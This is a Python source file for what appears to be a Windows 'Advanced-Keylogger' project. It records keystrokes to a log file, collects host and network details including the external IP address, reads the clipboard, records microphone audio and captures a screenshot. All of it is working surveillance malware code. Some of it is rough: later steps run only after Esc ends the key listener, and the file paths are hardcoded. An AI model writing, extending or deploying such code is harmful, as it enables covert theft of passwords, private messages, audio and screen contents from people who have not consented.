#Imports
from multiprocessing import Process, freeze_support
from pathlib import Path
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
from PIL import ImageGrab
import sounddevice as sd
from requests import get
import win32clipboard
import platform
import socket

#FILE NAMES TO STORE DATA 
system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
keys_info = "key_log.txt"
screenshot_info = "screenshot.png"

system_info_e = 'e_system.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_logged.txt'

#KEY MONITORING & LOGGING
count = 0
keys = []

#Function when a key is pressed
def on_press(key):
    global keys, count
    keys.append(key)
    count = count+1
    print("{0} pressed".format(key))
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

#Function when a key is released
def on_release(key):
    if key==Key.esc:
        return False

#Function to write the key presses to a file in a formatted manner
def write_file(keys):
    with open("test_log.txt", "a") as f:
        for key in keys:
            formatted_key = str(key).replace("'", "")
            #Add line for space
            if formatted_key.find("space") > 0:
                f.write("\n")
            #If not a special key then write otherwise ignore
            elif formatted_key.find("Key") == -1:
                f.write(formatted_key)

#Listen for keypresses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#SYSTEM INFORMATION
hostname = socket.gethostname()
ip_addr = socket.gethostbyname(hostname)
processor = platform.processor()
system = platform.system()
version = platform.version()
machine = platform.machine()
external_ip = get('https://api.ipify.org').text

#CLIPBOARD
win32clipboard.OpenClipboard(0)
try:
    clipboard_data = win32clipboard.GetClipboardData()
except:
    print("No data in clipboard!")

print("DATA IN CLIPBOARD: ", clipboard_data)
win32clipboard.CloseClipboard()

#SOUND
fs = 44100 #Sampling frequency
duration = 5 #Duration of recording in seconds

#Record audio
recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
sd.wait()
#Write audio to file
write(r"C:\Users\nikhi\Desktop\Advanced-Keylogger\recording.wav", fs, recording)

#SCREENSHOTS
screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False,
                            all_screens=False, xdisplay=None)
screenshot.save(fp="screenshot.png", Path=r"C:\Users\nikhi\Desktop\Advanced-Keylogger")

# if __name__ == "__main__":
#     #Ensure only 1 screenshot is taken
#     freeze_support()
#     Process(target=screenshot).start()